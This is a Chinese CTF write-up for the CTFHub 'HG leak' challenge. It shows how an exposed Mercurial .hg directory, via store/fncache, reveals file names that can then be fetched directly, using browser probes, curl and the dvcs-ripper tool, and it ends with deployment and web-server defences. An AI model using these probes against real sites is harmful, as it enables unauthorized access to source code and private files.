---
layout: post
title: CTFHub - HG 泄露 Writeup
platform: ctfhub
date: 2026-10-16 12:00:00 +0800
categories: CTF
---

CTFHub - HG 泄露 Writeup

一、题目信息

- 平台：CTFHub（技能树 → Web → 信息泄露 → **HG 泄露**）
- 题型：Web
- 考点：**`.hg`（Mercurial）目录泄露**、`fncache` 文件名清单
- 题目提示原文：

```text
当开发人员使用 Mercurial 进行版本控制，对站点自动部署。
如果配置不当,可能会将 .hg 文件夹(存在目录列表)直接部署到线上环境。
这就引起了 hg 泄露漏洞。
```

首页还会显示：**"Flag 在服务端旧版本的代码中，不太好使的情况下，试着手工解决"**

> 💡 最后那句"**不太好使的情况下，试着手工解决**"是重要提示 ——
> 因为 dvcs-ripper 处理 HG 时经常出问题（后面会讲）。

```text
探测结果（全部 200）：
    /.hg/requires              → 59 字节
    /.hg/last-message.txt      → 8 字节
    /.hg/store/fncache         → 61 字节   ★★ 关键文件
    /.hg/dirstate              → 128 字节
    /.hg/store/00changelog.i   → 356 字节
    /.hg/store/00manifest.i    → 290 字节
    /.hg/store/data/           → 403（不允许列目录，正常）

① .hg/requires 的内容（仓库格式特性）：
      dotencode | fncache | generaldelta | revlogv1 | sparserevlog | store

② ★ .hg/last-message.txt 的内容：
      add flag                    ← 线索：最后一次提交加了 flag

③ ★★ .hg/store/fncache 的内容（★ 仓库里所有文件的清单）：
      data/index.html.i              → 原路径: index.html
      data/50x.html.i                → 原路径: 50x.html
      data/flag_2488729465.txt.i     → 原路径: flag_2488729465.txt   ← ★ 就是这个！
                                                      ↑
                              去掉 data/ 前缀和 .i 后缀 = 原始文件名

④ ★ 拿文件名直接访问网站根目录：
      http://challenge-xxx:10800/flag_2488729465.txt
      → HTTP 200，Content-Type: text/plain，Content-Length: 33
      → 内容：ctfhub{c47d401489044ad8f2650f33}

flag         : ctfhub{c47d401489044ad8f2650f33}
```

> 💡 **本题的精髓**：`fncache` 只是"文件清单"，它不含内容；
> 但**有了文件名，直接去网站根目录访问同名文件**就拿到内容了 ——
> 这正是题目说的"手工解决"。

二、题目分析

**① Mercurial（hg）是什么**

```text
Mercurial（命令名 hg）= 分布式版本控制工具，和 Git 是同类。
    · 每个开发者本地都有完整版本库
    · 项目根目录下有个 .hg 隐藏目录，存着版本库全部数据
    · 常用命令：hg init / hg add / hg commit / hg log / hg diff / hg cat
```

**② `.hg` 目录的结构**

```text
.hg/
├── requires             仓库格式要求（纯文本，几行字）
├── dirstate             工作区文件状态（二进制）
├── last-message.txt     ★ 最后一次提交的说明（纯文本！常直接写着 "add flag"）
├── undo.branch / undo.desc / undo.dirstate
└── store/               ★ 版本库核心数据
    ├── 00changelog.i    变更日志索引（所有提交记录）
    ├── 00manifest.i     清单索引（每个版本包含哪些文件）
    ├── fncache          ★★ 文件名缓存 —— 列出仓库里所有文件！
    ├── undo
    └── data/            各文件的实际数据
        └── <文件路径>.i / .d
```

**③ 本题的突破口（和前面几题都不一样）**

```text
★ 关键在于两个"纯文本"文件：

    ① .hg/last-message.txt
         → 直接能看到最后一次提交的说明，往往就写着 "add flag"

    ② .hg/store/fncache
         → ★★ 这是 Mercurial 的"文件名缓存"，
           一行一个文件路径，比如：
               data/index.html.i
               data/50x.html.i
               data/flag_455230392.txt.i      ← ★ 原始路径一眼可见！
           去掉 data/ 前缀和 .i 后缀，就得到原始文件名。

★ 然后最关键的一步：
    拿到文件名后，直接访问【网站根目录下的同名文件】！

    因为这个文件在版本库里有，网站目录里通常也有一份 ——
    直接 <网站根>/flag_455230392.txt 就能拿到内容。

    （题目提示说的"不太好使的情况下试着手工解决"，指的就是这个 ——
      别死磕工具，直接去访问文件）
```

**④ 破题思路**

```text
① 探测 /.hg/ 是否可访问
② 读 /.hg/last-message.txt    → 看提交说明（常有线索）
③ 读 /.hg/store/fncache       → ★ 拿到仓库里所有文件的原始路径
④ 把文件名接到网站根目录后面直接访问 → flag 到手
```

三、解题步骤

**方法一：用我写的工具（纯 Python，双击即可）**

```text
双击 dump-hg-leak.bat
→ 粘贴题目根地址（结尾 :10800）
→ 回车
```

**实测输出**（我用 Python 构造了一个真实的 HG 环境来验证）：

```text
① 探测 .hg 目录
   ★ /.hg/requires                -> 200  仓库格式要求（纯文本）
   ★ /.hg/last-message.txt        -> 200  ★ 最后一次提交的说明
   ★ /.hg/dirstate                -> 200  工作区状态（二进制）
   ★ /.hg/store/fncache           -> 200  ★★ 文件名缓存（列出仓库里所有文件！）
   ★ /.hg/store/00changelog.i     -> 200  变更日志索引
   ★ /.hg/store/00manifest.i      -> 200  清单索引

② 先读那几个纯文本文件
  ── requires
     内容: revlogv1 | store | fncache | dotencode
  ── last-message.txt
     内容: add flag                    ← ★ 线索：最后一次提交加了 flag

③ ★ 读 .hg/store/fncache —— 仓库里所有文件的清单
  ✔ 拿到 3 行：
     data/index.html.i            → 原路径: index.html
     data/50x.html.i              → 原路径: 50x.html
     data/flag_455230392.txt.i    → 原路径: flag_455230392.txt   ← ★ 可疑！

④ ★ 拿文件名去访问网站根目录
  ── /index.html          内容: <html><h1>HG demo</h1></html>
  ── /50x.html            内容: <html>error</html>
  ── /flag_455230392.txt  ★★★ 发现 flag: ctfhub{demo_hg_flag_abc999}

★ 找到 flag：ctfhub{demo_hg_flag_abc999}
```

**方法二：用 dvcs-ripper（题目/教程推荐，但 HG 这题经常不好使）**

```bash
# 安装依赖（Kali / Linux）
sudo apt install -y perl libio-socket-ssl-perl

# 下载工具
git clone https://github.com/kost/dvcs-ripper.git
cd dvcs-ripper

# 利用
perl rip-hg.pl -u http://challenge-xxx:10800/.hg/

# 它会在当前目录生成一个以域名命名的文件夹
```

**⚠️ 但工具会报错**（教程里记录了这个现象）：

```text
根据返回结果可知利用是成功的，所有关键元数据都已下载完毕，
但由于本地系统缺少 hg 客户端，工具无法完成最后的组装步骤。
```

**然后你 `hg log` / `hg cat` 都会失败**：

```bash
hg log
# 能看到提交历史（如果装了 mercurial）
#   changeset:   1:1e7cf632c422
#   tag:         tip
#   summary:     add flag      ← ★ 这行告诉你 flag 在版本 1

hg cat flag_455230392.txt -r 1
# abort: flag_455230392.txt@d999632c...: no match found    ← ✘ 报错
```

**原因**：工具没把 `.hg/store/data/` 里的实际数据文件下载下来（所以 `hg cat` 找不到内容）。

**这时候就走"手工路线"**（就是题目提示说的）：

```bash
# ① 看 fncache，拿到文件名
cat .hg/store/fncache
#   data/index.html.i
#   data/50x.html.i
#   data/flag_455230392.txt.i      ← ★ 原始文件名在这里

# ② ★ 直接访问网站上的同名文件
curl "http://challenge-xxx:10800/flag_455230392.txt"
# 或者直接在浏览器打开：http://challenge-xxx:10800/flag_455230392.txt
```

**方法三：纯手工（只用浏览器，最符合题目提示）**

**第 1 步：探测 `.hg`**

浏览器挨个访问：

```text
http://challenge-xxx:10800/.hg/requires
http://challenge-xxx:10800/.hg/last-message.txt      ← ★ 看提交说明
http://challenge-xxx:10800/.hg/store/fncache         ← ★★ 看文件清单
```

**第 2 步：从 fncache 里找可疑文件名**

**fncache 的内容格式**：

```text
data/index.html.i
data/50x.html.i
data/flag_455230392.txt.i
```

**每一行的含义**：

```text
data/  <文件路径>  .i
└─┬─┘  └────┬───┘  └┬┘
 固定    ★ 原始文件名  索引文件后缀（revlog index）
 前缀    ← 你要的就是这个

★ 去掉 data/ 前缀、去掉 .i 后缀 = 原始文件名
```

**本步的收获**：看到 `flag_455230392.txt` 这个文件名 —— **这就是目标**。

**第 3 步：直接访问网站根目录下的那个文件**

```
浏览器地址栏：
http://challenge-xxx:10800/flag_455230392.txt
```

**页面上直接显示 flag** ✅

四、延伸知识

**① 为什么"直接访问文件"就行得通**

```text
因为 SVN / HG / Git 这类版本控制目录，
是放在【项目根目录】下的：
    /var/www/html/
    ├── .hg/              ← 版本库
    ├── index.html        ← 工作区的文件
    ├── 50x.html
    └── flag_455230392.txt  ← ★ 文件既在版本库里，也在网站目录里

所以 fncache 告诉你"版本库里有这个文件"，
网站根目录里通常也有一份同样的文件 —— 直接访问就行。
```

**② fncache 是什么（详细）**

```text
fncache = Filename Cache（文件名缓存）

作用：充当一份"地图/清单"，
      记录 .hg/store/data/ 目录下所有数据文件的路径。

为什么需要它：
    Mercurial 存文件时，会把原始路径做编码/哈希处理，
    所以 store/data/ 里的文件名不一定是原始文件名。
    fncache 就是"原始路径 → 存储路径"的对照表。

文件格式：
    data/<编码后的路径>.i     ← 该文件的 revlog 索引
    data/<编码后的路径>.d     ← 该文件的 revlog 数据

.i 和 .d 的含义：
    .i (index)  = 索引文件，记录每个版本的元数据（偏移、长度、父版本等）
    .d (data)   = 数据文件，存实际的压缩内容
```

**③ HG 泄露 vs Git / SVN 泄露（三者对比）**

| | Git | SVN | HG |
|---|---|---|---|
| 泄露目录 | `.git/` | `.svn/` | `.hg/` |
| **最容易的突破口** | `.git/logs/HEAD`（提交日志） | `.svn/wc.db`（SQLite） | **`.hg/store/fncache`**（文件清单） |
| 文件内容存哪 | `.git/objects/` | `.svn/pristine/` | `.hg/store/data/` |
| 内容是否压缩 | zlib | zlib | 是（revlog 格式） |
| 恢复工具 | GitHack / git | dvcs-ripper | dvcs-ripper（**常不好使**） |
| 本题的关键动作 | 拼对象路径下载 | 查 PRISTINE 表 | **拿文件名直接访问网站** |

**三者共同的核心逻辑**：

```text
★ 版本控制目录泄露 → 拿到"服务器上有哪些文件"的情报
  → 再想办法拿到文件内容（有的从对象库挖，有的直接访问网站）
```

**④ 防护**

```text
· 部署时排除版本控制目录：
      rsync -av --exclude='.hg' ...
      hg archive（而不是 hg clone）—— archive 不带 .hg
· 服务器拒绝访问：
      Nginx:  location ~ /\.hg { deny all; }
      Apache: <DirectoryMatch "/\.hg"> Require all denied </DirectoryMatch>
· 建议把 .git / .svn / .hg / .bzr / CVS 一起禁掉
```

五、总结

- **本题核心：`.hg` 泄露 → 读 `fncache` 拿到文件名 → 直接访问网站根目录下的同名文件 → flag。**
- 两个最关键的文件：

```text
.hg/last-message.txt   → 提交说明（常有"add flag"这种线索）
.hg/store/fncache      → ★ 仓库里所有文件的原始路径清单
```

- 记住这条"手工解决"的思路（题目提示专门强调了）：

```text
★ 工具不好使的时候，不要死磕工具 ——
  版本控制目录泄露的本质是"泄露了文件名/路径信息"，
  很多时候你拿着文件名，直接在浏览器里访问网站上的同名文件就行。
```

- 🎉 **CTFHub「信息泄露」系列全部通关**：

```text
✅ 目录遍历           —— Apache 目录列表
✅ PHPINFO            —— Ctrl+F 搜 flag
✅ 备份文件下载：
     ✅ 网站源码      —— www.zip
     ✅ bak 文件      —— index.php.bak
     ✅ vim 缓存      —— .index.php.swp
     ✅ .DS_Store     —— macOS 目录属性
✅ Git 泄露：
     ✅ Log           —— 提交历史
     ✅ Stash         —— 暂存内容
     ✅ Index         —— 暂存区
✅ SVN 泄露           —— wc.db + pristine
✅ HG 泄露            —— fncache（本题）
```

**配套文件**（都在工作区）：

```text
hg_leak_dump.py      纯 Python 的 HG 泄露工具（读 fncache + 拿文件名访问网站）
dump-hg-leak.bat     双击启动器
```
